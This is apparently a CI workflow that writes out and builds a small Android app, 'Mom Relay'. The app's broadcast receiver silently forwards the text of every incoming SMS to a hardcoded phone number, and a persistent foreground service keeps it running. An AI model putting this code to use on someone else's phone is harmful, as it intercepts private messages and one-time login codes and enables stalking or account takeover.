name: God Mode Build
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-java@v3
        with:
          distribution: 'zulu'
          java-version: '17'

      - name: Create Project Structure
        run: |
          rm -rf app build.gradle settings.gradle gradle.properties
          mkdir -p app/src/main/java/com/momrelay

          # 1. settings.gradle
          echo "include ':app'" > settings.gradle

          # 2. Root build.gradle
          cat <<'EOF' > build.gradle
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.1.1'
                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.9.0'
              }
          }
          allprojects { repositories { google(); mavenCentral() } }
          task clean(type: Delete) { delete rootProject.buildDir }
          EOF

          # 3. App build.gradle
          cat <<'EOF' > app/build.gradle
          plugins {
              id 'com.android.application'
              id 'org.jetbrains.kotlin.android'
          }
          android {
              namespace 'com.momrelay'
              compileSdk 34
              defaultConfig {
                  applicationId 'com.momrelay'
                  minSdk 26
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              buildFeatures { viewBinding true }
          }
          dependencies {
              implementation 'androidx.core:core-ktx:1.12.0'
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.google.android.material:material:1.11.0'
          }
          EOF

          # 4. Manifest (ANDROID 15 FIX: dataSync)
          cat <<'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools">
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.SEND_SMS" />
              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
              <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
              <application
                  android:label="Mom Relay"
                  android:theme="@style/Theme.AppCompat.Light.NoActionBar">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".RelayService" android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" />
                  <receiver android:name=".SmsReceiver" android:enabled="true" android:exported="true" android:permission="android.permission.BROADCAST_SMS">
                      <intent-filter android:priority="999">
                          <action android:name="android.provider.Telephony.SMS_RECEIVED" />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

          # 5. Service Code (ANDROID 15 FIX: Type Declaration)
          cat <<'EOF' > app/src/main/java/com/momrelay/RelayService.kt
          package com.momrelay
          import android.app.*
          import android.content.Intent
          import android.os.IBinder
          import androidx.core.app.NotificationCompat
          import android.content.pm.ServiceInfo
          import android.os.Build
          class RelayService : Service() {
              override fun onBind(i: Intent?): IBinder? = null
              override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
                  if (Build.VERSION.SDK_INT >= 26) {
                      val c = NotificationChannel("Relay", "Relay", NotificationManager.IMPORTANCE_LOW)
                      getSystemService(NotificationManager::class.java).createNotificationChannel(c)
                  }
                  val n = NotificationCompat.Builder(this, "Relay").setContentTitle("Active").setSmallIcon(android.R.drawable.ic_dialog_email).build()
                  if (Build.VERSION.SDK_INT >= 34) {
                      startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                  } else {
                      startForeground(1, n)
                  }
                  return START_STICKY
              }
          }
          EOF

          # 6. Main Activity & Receiver
          cat <<'EOF' > app/src/main/java/com/momrelay/MainActivity.kt
          package com.momrelay
          import android.os.Bundle
          import android.widget.*
          import android.content.Intent
          import androidx.appcompat.app.AppCompatActivity
          import android.Manifest
          import androidx.core.app.ActivityCompat
          import android.os.Build
          class MainActivity : AppCompatActivity() {
              override fun onCreate(s: Bundle?) {
                  super.onCreate(s)
                  val l = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
                  val b = Button(this).apply { text = "START" }
                  l.addView(b); setContentView(l)
                  b.setOnClickListener {
                      val p = mutableListOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.SEND_SMS, Manifest.permission.READ_PHONE_STATE)
                      if (Build.VERSION.SDK_INT >= 33) p.add(Manifest.permission.POST_NOTIFICATIONS)
                      ActivityCompat.requestPermissions(this, p.toTypedArray(), 101)
                      val i = Intent(this, RelayService::class.java)
                      if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
                  }
              }
          }
          EOF
          cat <<'EOF' > app/src/main/java/com/momrelay/SmsReceiver.kt
          package com.momrelay
          import android.content.*
          import android.telephony.*
          class SmsReceiver : BroadcastReceiver() {
              override fun onReceive(c: Context, i: Intent) {
                  if (i.action != "android.provider.Telephony.SMS_RECEIVED") return
                  val b = i.extras ?: return
                  val pdus = b.get("pdus") as Array<Any>?
                  val sms = SmsManager.getDefault()
                  pdus?.forEach {
                      val m = SmsMessage.createFromPdu(it as ByteArray, b.getString("format"))
                      try { sms.sendTextMessage("YOUR_NUMBER_HERE", null, "Fwd: " + m.messageBody, null, null) } catch (e: Exception) {}
                  }
              }
          }
          EOF

          # 7. Gradle Properties
          echo "org.gradle.jvmargs=-Xmx2048m" > gradle.properties
          echo "android.useAndroidX=true" >> gradle.properties

      - name: Setup Gradle 8.2
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.2'

      - name: Build APK
        run: gradle assembleDebug

      - uses: actions/upload-artifact@v4
        with:
          name: MomRelay-GodMode
          path: app/build/outputs/apk/debug/app-debug.apk
